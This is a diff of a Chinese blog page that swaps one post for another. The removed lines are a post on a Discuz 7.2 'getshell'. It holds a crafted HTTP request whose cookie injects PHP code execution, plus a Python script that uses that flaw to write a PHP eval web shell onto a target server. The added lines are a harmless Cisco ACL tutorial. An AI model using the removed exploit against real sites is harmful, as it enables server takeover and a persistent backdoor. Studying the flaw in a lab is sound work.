@@ -2,9 +2,9 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>安全开发-Discuz7.2Getshell脚本编写 | Falao&#39;s Blog</title>
+  <title>Cisco-访问控制列表 | Falao&#39;s Blog</title>
   <meta name="keywords" content="">
-  <meta name="description" content="安全开发-Discuz7.2Getshell脚本编写 | Falao&#39;s Blog">
+  <meta name="description" content="Cisco-访问控制列表 | Falao&#39;s Blog">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="ID：法老职业：渗透测试工程师证书：OSCP&#x2F;CISP-PTE">
 <meta property="og:type" content="website">
@@ -461,9 +461,9 @@
 </aside>
 <div id="post">
     <div class="pjax">
-        <article id="post-安全开发-Discuz7-2Getshell脚本编写" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-Cisco-访问控制列表" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">安全开发-Discuz7.2Getshell脚本编写</h1>
+        <h1 class="article-title">Cisco-访问控制列表</h1>
     
     <div class="article-meta">
         
@@ -473,7 +473,7 @@
             <i class="iconfont icon-category"></i>
             
             
-            <a  data-rel="Python专题">Python专题</a>
+            <a  data-rel="网络工程师">网络工程师</a>
             
         </span>
         
@@ -481,7 +481,7 @@
     </div>
     <div class="article-meta">
         
-            Created At : <time class="date" title='Updated At: 2021-01-28 10:59:05'>2021-01-27 09:05</time>
+            Created At : <time class="date" title='Updated At: 2021-02-12 16:04:16'>2021-02-12 15:38</time>
         
     </div>
     <div class="article-meta">
@@ -503,7 +503,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%EF%BC%9A%E5%AE%9E%E9%AA%8C%E7%8E%AF%E5%A2%83"><span class="toc-text">一：实验环境</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C%EF%BC%9A%E6%BC%8F%E6%B4%9E%E8%B5%B7%E5%9B%A0"><span class="toc-text">二：漏洞起因</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%89%EF%BC%9A%E4%BB%A3%E7%A0%81%E7%BC%96%E5%86%99"><span class="toc-text">三：代码编写</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E6%88%AA%E5%9B%BE"><span class="toc-text">实验截图</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%80%EF%BC%9AACL%E6%A6%82%E8%BF%B0"><span class="toc-text">一：ACL概述</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%E5%88%97%E8%A1%A8%EF%BC%88ACL%EF%BC%89"><span class="toc-text">访问控制列表（ACL）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AE%BF%E9%97%AE%E7%A9%BA%E6%8E%A7%E5%88%B6%E5%88%97%E8%A1%A8%E7%9A%84%E5%A4%84%E7%90%86%E8%BF%87%E7%A8%8B"><span class="toc-text">访问空控制列表的处理过程</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%E5%88%97%E8%A1%A8%E7%9A%84%E7%B1%BB%E5%9E%8B"><span class="toc-text">访问控制列表的类型</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%8C%EF%BC%9A%E6%A0%87%E5%87%86%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%E5%88%97%E8%A1%A8"><span class="toc-text">二：标准访问控制列表</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A4%E4%B8%80%EF%BC%9A%E6%A0%87%E5%87%86%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%E5%88%97%E8%A1%A8%E7%9A%84%E5%88%9B%E5%BB%BA"><span class="toc-text">步骤一：标准访问控制列表的创建</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A4%E4%BA%8C%EF%BC%9A%E5%B0%86ACL%E5%BA%94%E7%94%A8%E4%BA%8E%E6%8E%A5%E5%8F%A3"><span class="toc-text">步骤二：将ACL应用于接口</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A4%E4%B8%89%EF%BC%9A%E5%88%A0%E9%99%A4%E5%B7%B2%E5%BB%BA%E7%AB%8B%E7%9A%84%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%E5%88%97%E8%A1%A8"><span class="toc-text">步骤三：删除已建立的访问控制列表</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A4%E5%9B%9B%EF%BC%9A%E6%8E%A5%E5%8F%A3%E4%B8%8A%E5%8F%96%E6%B6%88ACL"><span class="toc-text">步骤四：接口上取消ACL</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A4%E4%BA%94%EF%BC%9A%E6%9F%A5%E7%9C%8B%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%E5%88%97%E8%A1%A8"><span class="toc-text">步骤五：查看访问控制列表</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%89%EF%BC%9A%E6%89%A9%E5%B1%95%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%E5%88%97%E8%A1%A8"><span class="toc-text">三：扩展访问控制列表</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%A9%E5%B1%95%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%E5%88%97%E8%A1%A8%E6%A1%88%E4%BE%8B"><span class="toc-text">扩展访问控制列表案例</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9B%9B%EF%BC%9A%E5%91%BD%E5%90%8D%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%E7%B1%BB%E8%A1%A8"><span class="toc-text">四：命名访问控制类表</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -519,36 +519,92 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h3 id="一：实验环境"><a href="#一：实验环境" class="headerlink" title="一：实验环境"></a>一：实验环境</h3><ul>
-<li>靶机：安装部署Ucenter与Discuz7.2</li>
-<li>攻击机：Python环境</li>
+        <h1 id="一：ACL概述"><a href="#一：ACL概述" class="headerlink" title="一：ACL概述"></a>一：ACL概述</h1><h4 id="访问控制列表（ACL）"><a href="#访问控制列表（ACL）" class="headerlink" title="访问控制列表（ACL）"></a>访问控制列表（ACL）</h4><ul>
+<li>读取第三层，第四层包头信息</li>
+<li>根据预定好的规则对包进行过滤</li>
 </ul>
-<h3 id="二：漏洞起因"><a href="#二：漏洞起因" class="headerlink" title="二：漏洞起因"></a>二：漏洞起因</h3><pre><code class="xaml">GET /viewthread.php?tid=10&amp;extra=page%3D1 HTTP/1.1    #固定访问格式
-Host: your-ip:8080
-Accept-Encoding: gzip, deflate
-Accept: */*
-Accept-Language: en
-User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
-Cookie: GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui; GLOBALS[_DCACHE][smilies][replacearray]=phpinfo();    #代码执行
-Connection: close</code></pre>
-<h3 id="三：代码编写"><a href="#三：代码编写" class="headerlink" title="三：代码编写"></a>三：代码编写</h3><pre><code class="python">'''
-POC:"&amp;x=$id=('echo%20“&lt;?php @eval($_POST[x]);?&gt;”&gt;shell.php');shell_exec($id);"
-'''
-import requests
-
-data=input("请输入写入数据：")
-file=input("请输入写入文件名：")
-
-url="http://192.168.31.49/discuz72/viewthread.php?tid=10&amp;extra=page%3D1"+"&amp;x="+"$id=('echo%20"+data+"%20&gt;%20"+file+"');shell_exec($id);"
-cookie={"Cookie":"GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui; GLOBALS[_DCACHE][smilies][replacearray]=eval($_REQUEST[x]);"}
-print(url)
-
-code=requests.post(url,headers=cookie).status_code
-if code==200:
-    print("ok")
-else:
-    print("no")</code></pre>
-<h3 id="实验截图"><a href="#实验截图" class="headerlink" title="实验截图"></a>实验截图</h3><p>…</p>
+<h4 id="访问空控制列表的处理过程"><a href="#访问空控制列表的处理过程" class="headerlink" title="访问空控制列表的处理过程"></a>访问空控制列表的处理过程</h4><ul>
+<li>如果匹配第一条规则，则不再往下检查，路由器将决定该数据包允许通过或拒绝通过</li>
+<li>如果不匹配第一条规则，则依次往下检查，知道有有任何一条规则匹配</li>
+<li>如果最后没有任何一条规则匹配，则路由器根据默认的规则将丢弃该数据包</li>
+</ul>
+<h4 id="访问控制列表的类型"><a href="#访问控制列表的类型" class="headerlink" title="访问控制列表的类型"></a>访问控制列表的类型</h4><ul>
+<li>标准访问控制列表基于源IP地址的过滤数据包</li>
+<li>扩展访问控制列表基于源IP地址，目的IP地址，指定协议，端口等来过滤数据包列表号是100~199</li>
+<li>命名访问控制列表命名访问控制列表在标准和扩展访问控制列表中使用名称代替表号</li>
+</ul>
+<h1 id="二：标准访问控制列表"><a href="#二：标准访问控制列表" class="headerlink" title="二：标准访问控制列表"></a>二：标准访问控制列表</h1><h4 id="步骤一：标准访问控制列表的创建"><a href="#步骤一：标准访问控制列表的创建" class="headerlink" title="步骤一：标准访问控制列表的创建"></a>步骤一：标准访问控制列表的创建</h4><pre><code class="shell">access-list 1 deny 192.168.1.1 0.0.0.0
+access-list 1 permit 192.168.1.0 0.0.0.255</code></pre>
+<blockquote>
+<p>通配符掩码：也叫做反掩码。用二进制数0和1表示，如果某位为1，表明这意味不需要进行匹配操作，如果0表明需要严格匹配。例如：192.168.1.0/24 子网掩码是255.255.255.0，其反码表示可以通过255.255.255.255减去255.255.255.0得到0.0.0.255</p>
+</blockquote>
+<ul>
+<li><p>隐含的拒绝语句</p>
+<pre><code class="shell">access-list 1 deny 0.0.0.0 255.255.255.255</code></pre>
+</li>
+</ul>
+<h4 id="步骤二：将ACL应用于接口"><a href="#步骤二：将ACL应用于接口" class="headerlink" title="步骤二：将ACL应用于接口"></a>步骤二：将ACL应用于接口</h4><blockquote>
+<p>接口模式:ip access-group 列表号 in或out</p>
+</blockquote>
+<pre><code class="shell">access-list 1 deny 192.168.1.1 0.0.0.0 或者写为
+access-list 1 deny host 192.1681.1  </code></pre>
+<pre><code class="shell">access-list deny 0.0.0.0 255.255.255.255或者写为
+access-list deny any </code></pre>
+<h4 id="步骤三：删除已建立的访问控制列表"><a href="#步骤三：删除已建立的访问控制列表" class="headerlink" title="步骤三：删除已建立的访问控制列表"></a>步骤三：删除已建立的访问控制列表</h4><pre><code class="shell">no access-list 列表号   //全局配置模式</code></pre>
+<h4 id="步骤四：接口上取消ACL"><a href="#步骤四：接口上取消ACL" class="headerlink" title="步骤四：接口上取消ACL"></a>步骤四：接口上取消ACL</h4><pre><code class="shell">no ip access-group 列表号 in或out</code></pre>
+<h4 id="步骤五：查看访问控制列表"><a href="#步骤五：查看访问控制列表" class="headerlink" title="步骤五：查看访问控制列表"></a>步骤五：查看访问控制列表</h4><pre><code class="shell">show access-lists //特权模式</code></pre>
+<h1 id="三：扩展访问控制列表"><a href="#三：扩展访问控制列表" class="headerlink" title="三：扩展访问控制列表"></a>三：扩展访问控制列表</h1><blockquote>
+<p>可以根据源IP地址，目的IP地址，指定协议，端口等过滤数据包</p>
+</blockquote>
+<ul>
+<li>扩展访问控制列表号:100-199</li>
+<li>eq等于，lt小于，gt大于，neq不等于</li>
+<li>扩展ACL应该应用在离源地址最近的路由器上</li>
+</ul>
+<h4 id="扩展访问控制列表案例"><a href="#扩展访问控制列表案例" class="headerlink" title="扩展访问控制列表案例"></a>扩展访问控制列表案例</h4><ul>
+<li>例子1</li>
+</ul>
+<pre><code class="shell">access-list 101 permit ip 192.168.1.0 0.0.0.255 192.168.2.0 0.0.0255
+(允许192.168.1.0网络访问192.168.2.0网络的所有的服务）   //全局模式
+access-list 101 deny ip any any //拒绝所有的服务  //全局模式</code></pre>
+<ul>
+<li>例子2</li>
+</ul>
+<pre><code class="shell">access 101 deny tcp 192.168.1.0 0.0.0.255 host 192.168.2.2 eq 21
+(拒绝192.168.1.0网段访问192.168.2.2的TCP的21端口   //全局配置模式
+access-list 101 permit ip any any (允许访问所有）</code></pre>
+<ul>
+<li>例子3</li>
+</ul>
+<pre><code class="shell">access-list 101 deny icmp 192.168.1.0 0.0.0.255 host 192.168.2.2 echo 
+拒绝192.168.1.0 ping 192.168.2.2</code></pre>
+<ul>
+<li><p>删除扩展ACL</p>
+<pre><code class="shell">no access-list 列表号</code></pre>
+<p>注意：扩展与标准ACL不能删除单条ACL语句，只能删除整个ACL</p>
+</li>
+</ul>
+<h1 id="四：命名访问控制类表"><a href="#四：命名访问控制类表" class="headerlink" title="四：命名访问控制类表"></a>四：命名访问控制类表</h1><ul>
+<li><p>命名访问控制类表可以配置标准命名可以配置扩展命名</p>
+</li>
+<li><p>命名访问控制列表的ACL语句默认第一条为10，第二条为20，以此类推</p>
+</li>
+<li><p>命名ACL可以删除单条ACL语句，而不必删除整个ACL。并且命名ACL语句可以有选择的插入到列表中的某个位置，使得ACL配置更加方便灵活</p>
+</li>
+<li><p>标准命名ACL的配置</p>
+<pre><code class="shell">全局：ip access-list standard 名字
+permit hsot 192.168.1.1
+deny deny</code></pre>
+<pre><code class="shell">ip access-group 名字 in或者out  //命名ACL应用于接口</code></pre>
+</li>
+<li><p>扩展命名ACL的配置</p>
+<pre><code class="shell">全局：ip access-list extended 名字
+deny tcp 192.168.1.0 0.0.0.255 host 192.168.2.2 eq 80 //拒绝1.0网段访问2.2的WEB服务
+permit ip any any </code></pre>
+</li>
+<li><p>未完待续…</p>
+</li>
+</ul>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至 2662904153@qq.com </span>
